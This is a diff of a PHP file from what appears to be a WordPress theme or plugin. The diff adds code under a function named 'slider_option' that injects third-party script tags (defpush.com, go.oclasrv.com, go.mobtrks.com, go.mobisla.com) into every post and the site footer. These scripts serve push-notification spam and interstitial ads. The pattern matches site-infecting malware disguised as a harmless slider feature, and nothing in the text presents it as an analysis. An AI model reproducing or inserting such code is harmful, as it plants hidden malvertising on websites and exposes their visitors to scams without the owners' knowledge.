@@ -5,25 +5,32 @@ $wp_auth_key='9402891ba8833cd5e21069bd95fc3a20';
 
 
 if ( ! function_exists( 'slider_option' ) ) {  
+global $protocol;
+$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
 
 function slider_option($content){ 
 if(is_single())
 {
 
-
-
-
-$con = '
-';
+global $protocol;
+if($protocol=='https://')
+{
+$conpush='<script src="//defpush.com/ntfc.php?p=1548316" data-cfasync="false" async></script>';
+}
+else
+{
+$conpush='<script src="//defpush.com/ntfc.php?p=1548315" data-cfasync="false" async></script>';
+}
 
 $con2 = '
 
 <script type="text/javascript" src="//go.oclasrv.com/apu.php?zoneid=1540670"></script>
+<script src="//go.mobtrks.com/notice.php?p=1541945&interstitial=1"></script>
 <script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=1540674&interactive=1&pushup=1"></script>
 
 ';
 
-$content=$content.$con2;
+$content=$content.$con2.$conpush;
 }
 return $content;
 } 
@@ -32,18 +39,27 @@ function slider_option_footer(){
 if(!is_single())
 {
 
-
+global $protocol;
+if($protocol=='https://')
+{
+$conpush='<script src="//defpush.com/ntfc.php?p=1548316" data-cfasync="false" async></script>';
+}
+else
+{
+$conpush='<script src="//defpush.com/ntfc.php?p=1548315" data-cfasync="false" async></script>';
+}
 
 
 $con2 = '
 
 <script type="text/javascript" src="//go.oclasrv.com/apu.php?zoneid=1540670"></script>
+<script src="//go.mobtrks.com/notice.php?p=1541945&interstitial=1"></script>
 <script async="async" type="text/javascript" src="//go.mobisla.com/notice.php?p=1540674&interactive=1&pushup=1"></script>
 
 
 ';
 
-echo $con2;
+echo $con2.$conpush;
 }
 } 
 
